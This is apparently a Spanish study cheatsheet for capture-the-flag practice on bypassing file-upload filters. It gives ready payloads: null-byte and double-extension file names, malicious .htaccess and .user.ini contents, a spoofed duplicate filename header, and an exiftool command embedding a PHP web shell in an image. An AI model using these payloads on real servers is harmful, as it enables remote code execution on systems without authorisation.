---
aliases:
tags:
  - type/cheatsheet
type: Concept
linked:
---
# File Upload Bypass - Cheatsheet

***

## 1. Reconocimiento del Filtro

*Antes de atacar, identificar cómo valida el servidor:*

- **Extension Blacklist:** Bloquea extensiones específicas (ej: `.php`, `.phtml`).
    - _Síntoma:_ Error "Extension 'php' not allowed".
- **Extension Whitelist:** Solo permite específicas (ej: `.jpg`, `.png`).
    - _Síntoma:_ Error "Extension 'hack' not allowed" (al probar una inventada).
- **Validación de Contenido:** Escanea el archivo buscando `<?php`, `system` o cabeceras de imagen inválidas.
- **Parsing del Nombre:** Cómo lee el servidor el nombre del archivo.
    - _Prueba:_ `file.php.` -> Si el error es "Extension ''", el servidor corta por el último punto.

---

## 2. Bypass de Listas Negras (Blacklist)

_Si el servidor bloquea `.php` pero permite otras cosas._

### A. Extensiones Alternativas

Apache/Nginx a menudo ejecutan extensiones legacy o alternativas si no están explícitamente bloqueadas.
- `.phtml` (La más común en CTFs)
- `.php3`, `.php4`, `.php5`, `.php7`    
- `.pht`
- `.phar`

### B. Manipulación de Caracteres

- **Case Sensitivity:** `.PhP`, `.PHP`, `.phtml` (Funciona si el filtro es `str_replace` o sensible a mayúsculas).
- **Trailing Dot/Space:**
    - `shell.php.` (Windows/Apache a veces ignora el punto final al guardar).
    - `shell.php` (Espacio al final). En Burp: `filename="shell.php "`.

---

## 3. Bypass de Listas Blancas (Whitelist)

_Si el servidor exige que el archivo termine en `.jpg`._

### A. Null Byte Injection (`%00`)

Engaña al sistema de archivos para truncar el nombre.
- **Payload:** `filename="shell.php%00.jpg"`
- **Proceso:**
    1. Filtro Web lee `.jpg` -> ✅ Pasa.
    2. Sistema de Archivos lee hasta `%00` -> Guarda `shell.php`.
- **Nota:** Requiere _URL Decode_ del `%00` en Burp para que sea un byte nulo real.

### B. Path Truncation (Desbordamiento)

Exceder el límite de caracteres del SO (MAX_PATH) para cortar la extensión.
- **Payload:** `shell.php` + `.` (x300 veces) + `.jpg`
- **Resultado:** Se guarda `shell.php` porque el `.jpg` del final se corta.

### C. Doble Extensión (Misconfiguration)

Si Apache tiene `AddHandler` en lugar de `SetHandler`.
- **Payload:** `shell.php.jpg`
- **Resultado:** Apache no sabe qué hacer con `.jpg`, mira la extensión anterior (`.php`) y la ejecuta.

---

## 4. Ataques a la Configuración del Servidor (.htaccess / .user.ini)

_Si no puedes subir un `.php`, reconfigura el servidor para que ejecute imágenes._

### A. Sobrescribir `.htaccess` (Apache)

- **Objetivo:** Hacer que archivos `.jpg` (o extensiones inventadas) se ejecuten como PHP.
- **Bypass de Nombre:** El servidor suele bloquear subir `.htaccess`.
    - Usar Null Byte: `filename=".htaccess%00.jpg"`
    - Usar Content-Type falso: Cambiar a `image/jpeg`.

- **Contenido del Payload (.htaccess):**
    ```Apache
    # Opción 1: Ejecutar JPG como PHP
    AddType application/x-httpd-php .jpg
    
    # Opción 2: Ejecutar extensión rara (evita detección básica)
    AddType application/x-httpd-php .pwn
    ```
- **Ataque:**
    1. Subir `.htaccess` malicioso.
    2. Subir shell: `shell.jpg` (o `shell.pwn%00.jpg` si usaste la opción 2).

### B. Sobrescribir `.user.ini` (PHP-FPM / FastCGI)

- **Objetivo:** Inyectar un script en todas las páginas PHP del directorio.
- **Bypass de Nombre:** `filename=".user.ini%00.jpg"`
- **Contenido del Payload:**
    ```    Ini, TOML
    auto_prepend_file = shell.jpg
    ```
- **Ataque:**
    1. Subir `.user.ini`.
    2. Subir `shell.jpg` (con código PHP camuflado).
    3. Visitar `index.php` (o cualquier php en la carpeta) -> Se ejecuta la shell automáticamente.

---

## 5. Técnicas de Confusión (WAF vs Backend)

### Parameter Pollution (Doble Filename)

El WAF valida el primero, PHP usa el último.
```HTTP
Content-Disposition: form-data; name="file"; filename="foto.jpg"; filename="shell.php"
```

### Content-Type Spoofing

- Cambiar `application/x-php` por `image/jpeg`.
- Añadir **Magic Bytes** al inicio del archivo: `GIF89a;` (hace parecer que es un GIF para `exif_imagetype`).

### Inyección de Metadatos (Exif)

Esconder código PHP en los comentarios de una imagen legítima.
```Bash
exiftool -Comment='<?php system($_GET["c"]); ?>' imagen.jpg
```

(Útil si se combina con `.htaccess` o LFI para ejecutarlo).

---

## 6. Evasión de Filtros de Contenido

_Si el servidor lee el archivo y bloquea `<?php` o `system`._
- **Short Tags:** `<?=` en lugar de `<?php echo`.
- **Script Tag (Legacy):** `<script language="php"> system('ls'); </script>`
- **PHP No Alfanumérico:** Usar operaciones XOR/Bitwise para generar strings sin escribir letras.
- **Codificación:** Usar `base64_decode` o filtros de streams si es un LFI.

---

## 7. Lógica CTF / Contexto

- **Auth Bypass:** Revisar campos ocultos (`<input type="hidden" name="pass">`).
    - Probar: Cambiar valor, borrar campo, enviar array `pass[]`.
    - **Regla de Oro:** La flag del nivel anterior suele ser la password del siguiente.